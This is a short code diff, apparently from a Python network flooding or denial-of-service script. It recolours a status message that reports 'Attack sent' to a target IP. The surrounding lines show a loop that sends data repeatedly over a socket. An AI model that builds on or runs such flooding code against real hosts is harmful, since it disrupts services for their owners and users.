@@ -104,7 +104,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print(i +"BASE2  Attack sent  " +str(ip)+ ")
+			print(i +"\033[92mBASE2 \033[92mAttack sent \033[31m" +str(ip)+ "\033[0m")
 		except:
 			s.close()
 			print("[*] Error!!!")
